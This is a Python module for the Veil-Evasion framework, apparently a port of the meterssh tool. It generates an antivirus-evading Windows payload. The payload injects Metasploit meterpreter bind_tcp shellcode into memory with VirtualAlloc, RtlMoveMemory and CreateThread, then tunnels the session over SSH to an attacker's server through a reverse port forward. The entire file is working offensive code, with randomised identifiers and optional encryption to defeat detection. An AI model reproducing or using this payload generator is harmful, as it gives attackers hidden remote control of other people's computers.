""""
Basically a port of https://github.com/trustedsec/meterssh for Veil-Evasion

Injects windows/meterpreter/bind_tcp into memory then tunnels meterpreter over ssh
back to the attackers machine

Module by @byt3bl33d3r
"""

from modules.common import helpers
from modules.common import shellcode
from modules.common import encryption

import settings

class Payload:
	
	def __init__(self):
		# required options
		self.description = "Tunnels windows/meterpreter/bind_tcp over ssh"
		self.language = "python"
		self.rating = "Excellent"
		self.extension = "py"

		self.shellcode = shellcode.Shellcode()
		
		# options we require user interaction for- format is {Option : [Value, Description]]}
		self.required_options = {"compile_to_exe" : ["Y", "Compile to an executable"],
								 "use_pyherion"   : ["N", "Use the pyherion encrypter"],
								 "SSHUSER"        : ["", "User for ssh"],
								 "SSHPASS"        : ["", "Password for ssh"],
								 "SSHOST"         : ["", "IP of your ssh server"],
								 "SSHPORT"        : ["22", "Port of your SSH server"],
								 "LPORT"          : ["8021", "Port to bind and forward on remote host"]}

	def generate(self):

		self.shellcode.SetPayload(["windows/meterpreter/bind_tcp", ["LHOST=127.0.0.1", 
																	"LPORT=" + self.required_options["LPORT"][0]]])

		Shellcode = self.shellcode.generate()

		#first randomize function names
		inject_func = helpers.randomString()
		handler_func = helpers.randomString()
		rfwtunnel_func = helpers.randomString()
		main2_func = helpers.randomString()

		imports = "from socket import *\nimport paramiko\nimport multiprocessing\nimport time\nimport subprocess"
		imports += "\nimport ctypes\nimport thread\nimport threading\nimport select\n"

		shellcode_var = helpers.randomString()
		p_var = helpers.randomString()
		jobs_var = helpers.randomString()
		shellport_var = helpers.randomString()
		user_var = helpers.randomString()
		password_var = helpers.randomString()
		rhost_var = helpers.randomString()
		port_var = helpers.randomString()

		main = "if __name__ == '__main__':"
		main += "\n\tmultiprocessing.freeze_support()"
		main += "\n\t%s = r'%s'" % (shellcode_var, Shellcode)
		main += "\n\t%s = %s.decode('string_escape')" % tuple([shellcode_var]*2)
		main += "\n\t%s = bytearray(%s)"% tuple([shellcode_var]*2)
		main += "\n\t%s = '%s'" % (shellport_var, self.required_options["LPORT"][0])
		main += "\n\ttime.sleep(2)"
		main += "\n\t%s = multiprocessing.Process(target=%s, args=(%s,))" % (p_var, inject_func, shellcode_var)
		main += "\n\t%s = []" % jobs_var
		main += "\n\t%s.append(%s)" % (jobs_var, p_var)
		main += "\n\t%s.start()" % p_var
		main += "\n\t%s = '%s'" % (user_var, self.required_options["SSHUSER"][0])
		main += "\n\t%s = '%s'" % (password_var, self.required_options["SSHPASS"][0])
		main += "\n\t%s = '%s'" % (rhost_var, self.required_options["SSHOST"][0])
		main += "\n\t%s = '%s'" % (port_var, self.required_options["SSHPORT"][0])
		main += "\n\ttime.sleep(3)"
		main += "\n\tthread.start_new_thread(%s,(%s, %s, %s, %s, %s))\n" % (main2_func, user_var, password_var, rhost_var, port_var, shellport_var)

		shellport_var = helpers.randomString()
		user_var = helpers.randomString()
		password_var = helpers.randomString()
		rhost_var = helpers.randomString()
		port_var = helpers.randomString()
		server_var = helpers.randomString()
		remote_var = helpers.randomString()
		client_var = helpers.randomString()

		main2 = "def %s(%s, %s, %s, %s, %s):" % (main2_func, user_var, password_var, rhost_var, port_var, shellport_var)
		main2 += "\n\t%s = [%s, int(%s)]" % (server_var, rhost_var, port_var)
		main2 += "\n\t%s = ['127.0.0.1', int(%s)]" % (remote_var, shellport_var)
		main2 += "\n\t%s = paramiko.SSHClient()" % client_var
		main2 += "\n\t%s.load_system_host_keys()" % client_var
		main2 += "\n\t%s.set_missing_host_key_policy(paramiko.AutoAddPolicy())" % client_var
		main2 += "\n\twhile True:"
		main2 += "\n\t\ttry:" 
		main2 += "\n\t\t\t%s.connect(%s[0], %s[1], username=%s, key_filename=None, look_for_keys=False, password=%s)" % (client_var, server_var, server_var, user_var, password_var)
		main2 += "\n\t\texcept Exception:"
		main2 += "\n\t\t\tpass\n\t\t\ttime.sleep(5)"
		main2 += "\n\t\telse: break"
		main2 += "\n\t\ttry:"
		main2 += "\n\t\t\t%s(int(%s), %s[0], %s[1], %s.get_transport())" % (rfwtunnel_func, shellport_var, remote_var, remote_var, client_var)
		main2 += "\n\t\texcept Exception:"
		main2 += "\n\t\t\tpass\n\t\t\ttime.sleep(5)"

		shellcode_var = helpers.randomString()
		ptr_var = helpers.randomString()
		ht_var = helpers.randomString()
		buff_var = helpers.randomString()

		inject = "def %s(%s):" % (inject_func, shellcode_var)
		inject += "\n\t%s = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),ctypes.c_int(len(%s)),ctypes.c_int(0x3000),ctypes.c_int(0x40))" % (ptr_var, shellcode_var)
		inject += "\n\tctypes.windll.kernel32.VirtualLock(ctypes.c_int(%s), ctypes.c_int(len(%s)))" % (ptr_var, shellcode_var)
		inject += "\n\t%s = (ctypes.c_char * len(%s)).from_buffer(%s)" % (buff_var, shellcode_var, shellcode_var)
		inject += "\n\tctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(%s), %s, ctypes.c_int(len(%s)))" % (ptr_var, buff_var, shellcode_var)
		inject += "\n\t%s = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_int(%s),ctypes.c_int(0),ctypes.c_int(0),ctypes.pointer(ctypes.c_int(0)))" % (ht_var, ptr_var)
		inject += "\n\tctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(%s),ctypes.c_int(-1))\n" % ht_var

		chan_var = helpers.randomString()
		host_var = helpers.randomString()
		port_var = helpers.randomString()
		sock_var = helpers.randomString()
		r_var = helpers.randomString(); w_var = helpers.randomString(); x_var = helpers.randomString()
		data_var = helpers.randomString()

		handler = "def %s(%s, %s, %s):" % (handler_func, chan_var, host_var, port_var)
		handler += "\n\t%s = socket()" % sock_var
		handler += "\n\ttry:" 
		handler += "\n\t\t%s.connect((host, port))" % sock_var
		handler += "\n\texcept Exception: pass"
		handler += "\n\twhile True:"
		handler += "\n\t\t%s, %s, %s = select.select([%s, %s], [], [])" % (r_var, w_var, x_var, sock_var, chan_var)
		handler += "\n\t\tif %s in %s:" % (sock_var, r_var)
		handler += "\n\t\t\t%s = %s.recv(1024)" %(data_var, sock_var)
		handler += "\n\t\tif len(%s) == 0: break" % data_var
		handler += "\n\t\t%s.send(%s)" % (chan_var, data_var)
		handler += "\n\t\tif %s in %s:" % (chan_var, r_var)
		handler += "\n\t\t\t%s = %s.recv(1024)" % (data_var, chan_var)
		handler += "\n\t\tif len(%s) == 0: break" % data_var
		handler	+= "\n\t\t%s.send(%s); %s.close(); %s.close()\n" % (sock_var, data_var, chan_var, sock_var)

		server_port_var = helpers.randomString()
		remote_host_var = helpers.randomString()
		remote_port_var = helpers.randomString()
		transport_var = helpers.randomString()
		chan_var = helpers.randomString()
		thr_var = helpers.randomString()

		rfw_tunnel = "def %s(%s, %s, %s, %s):" % (rfwtunnel_func, server_port_var, remote_host_var, remote_port_var, transport_var)
		rfw_tunnel += "\n\t%s.request_port_forward('', %s)" % (transport_var, server_port_var)
		rfw_tunnel += "\n\twhile True:"
		rfw_tunnel += "\n\t\t%s = %s.accept(1000)" % (chan_var, transport_var)
		rfw_tunnel += "\n\t\tif %s is None:" % chan_var
		rfw_tunnel += "\n\t\t\t\tcontinue"
		rfw_tunnel += "\n\t\t%s = threading.Thread(target=%s, args=(%s, %s, %s))" %(thr_var, handler_func, chan_var, remote_host_var, remote_port_var)
		rfw_tunnel += "\n\t\t%s.setDaemon(True)" % thr_var
		rfw_tunnel += "\n\t\t%s.start()\n" % thr_var

		PayloadCode = imports + inject + handler + rfw_tunnel + main2 + main

		if self.required_options["use_pyherion"][0].lower() == "y":
			PayloadCode = encryption.pyherion(PayloadCode)

		return PayloadCode
